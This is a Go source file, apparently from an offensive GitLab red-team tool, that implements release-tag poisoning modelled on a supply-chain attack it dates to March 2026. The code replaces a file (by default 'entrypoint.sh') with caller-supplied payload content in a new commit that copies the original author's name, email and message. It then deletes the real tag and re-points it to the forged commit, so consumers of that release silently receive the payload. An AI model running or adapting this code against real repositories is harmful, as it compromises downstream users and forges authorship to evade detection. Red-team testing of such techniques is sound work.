package tamper

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	gitlab "gitlab.com/gitlab-org/api/client-go"
)

// TagCommitInfo captures metadata from the original tagged commit.
type TagCommitInfo struct {
	SHA            string `json:"sha"`
	AuthorName     string `json:"author_name"`
	AuthorEmail    string `json:"author_email"`
	CommitterName  string `json:"committer_name"`
	CommitterEmail string `json:"committer_email"`
	Message        string `json:"message"`
}

// TamperTagOptions configures tag poisoning (Trivy-style supply chain attack).
type TamperTagOptions struct {
	TagName        string // required: tag to poison (e.g., "v1.0.0")
	TargetFile     string // file to replace (default: "entrypoint.sh")
	PayloadContent string // required: replacement file content (the payload)
	SourceRef      string // ref to base the new commit tree on (default: project default branch HEAD)
	CommitMessage  string // override cloned commit message (optional)
	AuthorName     string // override cloned author name (optional)
	AuthorEmail    string // override cloned author email (optional)
}

// TamperTagResult captures the outcome of tag poisoning.
type TamperTagResult struct {
	TagName           string `json:"tag_name"`
	OriginalCommitSHA string `json:"original_commit_sha"`
	NewCommitSHA      string `json:"new_commit_sha"`
	SourceRef         string `json:"source_ref"`
	TargetFile        string `json:"target_file"`
	ClonedAuthor      string `json:"cloned_author"`
	ClonedMessage     string `json:"cloned_message"`
}

// GetTagCommit fetches a tag and its commit metadata from the GitLab API.
func GetTagCommit(ctx context.Context, client *gitlabx.Client, projectID any, tagName string) (*TagCommitInfo, error) {
	tag, _, err := client.GL.Tags.GetTag(projectID, tagName, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("get tag %q: %w", tagName, err)
	}
	if tag.Commit == nil {
		return nil, fmt.Errorf("tag %q has no commit", tagName)
	}
	// Get full commit metadata (tag.Commit may be partial)
	commit, _, err := client.GL.Commits.GetCommit(projectID, tag.Commit.ID, nil, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("get commit %s: %w", tag.Commit.ID, err)
	}
	return &TagCommitInfo{
		SHA:            commit.ID,
		AuthorName:     commit.AuthorName,
		AuthorEmail:    commit.AuthorEmail,
		CommitterName:  commit.CommitterName,
		CommitterEmail: commit.CommitterEmail,
		Message:        commit.Message,
	}, nil
}

// TamperTag poisons a git tag by creating a new commit with a swapped file
// and re-pointing the tag to the new commit. This replicates the technique
// used in the Trivy supply chain attack (2026-03):
//  1. Fetch the original tag's commit metadata (author, message)
//  2. Create a temp branch from the source ref (default branch HEAD)
//  3. Create a new commit that updates the target file with the payload,
//     cloning the original commit's author and message
//  4. Delete the old tag
//  5. Create a new tag with the same name pointing to the new commit
//  6. Clean up the temp branch
func TamperTag(ctx context.Context, client *gitlabx.Client, projectID any, opts TamperTagOptions) (*TamperTagResult, error) {
	tagName := strings.TrimSpace(opts.TagName)
	if tagName == "" {
		return nil, fmt.Errorf("tag name is required")
	}
	if strings.TrimSpace(opts.PayloadContent) == "" {
		return nil, fmt.Errorf("payload content is required")
	}
	targetFile := strings.TrimSpace(opts.TargetFile)
	if targetFile == "" {
		targetFile = "entrypoint.sh"
	}
	targetFile = strings.TrimPrefix(targetFile, "/")

	// 1. Get original tag commit metadata
	original, err := GetTagCommit(ctx, client, projectID, tagName)
	if err != nil {
		return nil, err
	}

	// Resolve author and message (use original unless overridden)
	authorName := strings.TrimSpace(opts.AuthorName)
	if authorName == "" {
		authorName = original.AuthorName
	}
	authorEmail := strings.TrimSpace(opts.AuthorEmail)
	if authorEmail == "" {
		authorEmail = original.AuthorEmail
	}
	commitMsg := strings.TrimSpace(opts.CommitMessage)
	if commitMsg == "" {
		commitMsg = original.Message
	}

	// Resolve source ref
	sourceRef := strings.TrimSpace(opts.SourceRef)
	if sourceRef == "" {
		p, _, perr := client.GL.Projects.GetProject(projectID, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
		if perr != nil {
			return nil, fmt.Errorf("get project default branch: %w", perr)
		}
		sourceRef = p.DefaultBranch
		if sourceRef == "" {
			sourceRef = "main"
		}
	}

	// 2. Create temp branch from source ref
	tmpBranch, err := tempBranchName()
	if err != nil {
		return nil, fmt.Errorf("generate temp branch name: %w", err)
	}
	_, _, err = client.GL.Branches.CreateBranch(projectID, &gitlab.CreateBranchOptions{
		Branch: new(tmpBranch),
		Ref:    new(sourceRef),
	}, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("create temp branch %q from %q: %w", tmpBranch, sourceRef, err)
	}

	// Ensure cleanup of temp branch even on error
	defer func() {
		_, _ = client.GL.Branches.DeleteBranch(projectID, tmpBranch, gitlab.WithContext(ctx))
	}()

	// 3. Create new commit with file swap
	action := gitlab.FileUpdate
	commit, _, err := client.GL.Commits.CreateCommit(projectID, &gitlab.CreateCommitOptions{
		Branch:        new(tmpBranch),
		CommitMessage: new(commitMsg),
		AuthorName:    new(authorName),
		AuthorEmail:   new(authorEmail),
		Actions: []*gitlab.CommitActionOptions{
			{
				Action:   &action,
				FilePath: new(targetFile),
				Content:  new(opts.PayloadContent),
			},
		},
	}, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("create commit with file swap: %w", err)
	}
	newSHA := commit.ID

	// 4. Delete old tag
	_, err = client.GL.Tags.DeleteTag(projectID, tagName, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("delete tag %q: %w", tagName, err)
	}

	// 5. Create new tag pointing to the new commit
	_, _, err = client.GL.Tags.CreateTag(projectID, &gitlab.CreateTagOptions{
		TagName: new(tagName),
		Ref:     new(newSHA),
	}, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("create tag %q pointing to %s: %w", tagName, newSHA, err)
	}

	return &TamperTagResult{
		TagName:           tagName,
		OriginalCommitSHA: original.SHA,
		NewCommitSHA:      newSHA,
		SourceRef:         sourceRef,
		TargetFile:        targetFile,
		ClonedAuthor:      fmt.Sprintf("%s <%s>", authorName, authorEmail),
		ClonedMessage:     commitMsg,
	}, nil
}

// tempBranchName generates a random temporary branch name for the tag swap.
func tempBranchName() (string, error) {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return "_gzx-tag-tmp-" + hex.EncodeToString(b), nil
}
